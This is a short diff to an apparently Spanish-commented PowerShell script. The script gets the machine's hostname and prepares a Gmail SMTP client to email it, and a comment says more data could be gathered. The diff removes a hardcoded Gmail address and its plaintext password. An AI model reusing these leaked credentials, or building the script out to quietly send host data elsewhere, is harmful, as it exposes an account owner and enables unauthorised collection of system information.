@@ -1,6 +1,6 @@
 ﻿$nombrepc = Hostname # Se podrían obtener o sacar más datos que tansolo el nombre
-$email = "faam1612@gmail.com" # Correo destino es un correo autoenviado de la persona a si misma
-$pass = "warofworld1612" # Contraseña del correo para las credenciales
+$email = "" # Correo destino es un correo autoenviado de la persona a si misma
+$pass = "" # Contraseña del correo para las credenciales
 $smtpServer = "smtp.gmail.com" # Direccion del servidor smtp
 $msg = new-object Net.Mail.MailMessage # Creacion del objeto mensaje/correo
 $smtp = new-object Net.Mail.SmtpClient($smtpServer) # Creación del objeto con la conexión smtp
